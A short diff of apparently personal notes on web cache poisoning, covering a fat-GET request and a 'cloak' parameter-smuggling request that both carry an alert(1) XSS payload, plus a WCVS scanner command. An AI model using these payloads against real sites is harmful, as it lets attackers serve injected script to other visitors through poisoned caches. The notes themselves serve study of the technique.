@@ -14,13 +14,13 @@ GET /admin?lang=en
 Content-Type: application/x-www-form-urlencoded
 
 lang=`<img src=0 onerror=alert(1)>`
-the server saves the body lang to the response while the cache save the response under lang=en , so when victim request lang=en the payload is server 
+the server saves the body lang of the response while the cache save the response under lang=en , so when victim request lang=en the payload is server 
 
 
 Cloak attack 
 GET /admin?lang=en&a=blabla;lang=`<img src=0 onerror=alert(1)>`
 some times in server you can separate between params other than "&" so in Bottle Python you use ; 
-no again diff between server and cache so you give the cache lang=en and the server lang=`<img src=0 onerror=alert(1)>` which is add to response
+so again diff between server and cache so you give the cache lang=en and the server lang=`<img src=0 onerror=alert(1)>` which is add to response
 
 WCVS
 wcvs -u url  -sp language=en -gr
